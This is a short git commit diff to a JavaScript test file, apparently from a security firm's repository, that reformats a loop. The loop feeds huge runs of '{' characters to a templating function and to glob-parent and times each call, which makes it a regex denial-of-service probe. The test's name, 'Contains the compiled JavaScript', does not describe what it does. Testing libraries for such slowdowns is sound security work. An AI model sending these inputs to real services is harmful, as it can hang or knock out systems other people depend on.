20aa85fdc8b42e1c586b2a6418f1e5ea63c22515
torbeerandom <tor@legitsecurity.com>
2022-02-03 16:36:50 +0200

    fixed some syntax issues

--- __test__/game.test.js
+++ __test__/game.test.js
@@ -10,10 +10,10 @@ const globParent = require('glob-parent')
 describe('App', () => {
   it('Contains the compiled JavaScript', async () => {
     for (let i = 1; i <= 50000; i++) {
-      let time = Date.now();
-      let attackStr = '' + '{'.repeat(i * 10000) + 'answer';
+      const time = Date.now()
+      const attackStr = '' + '{'.repeat(i * 10000) + 'answer'
       tmpl(attackStr, { answer: 42 })
-      const timeCost = Date.now() - time;
+      const timeCost = Date.now() - time
       console.log('attackStr.length: ' + attackStr.length + ': ' + timeCost + ' ms')
     }
     globParent(buildAttack(5000))
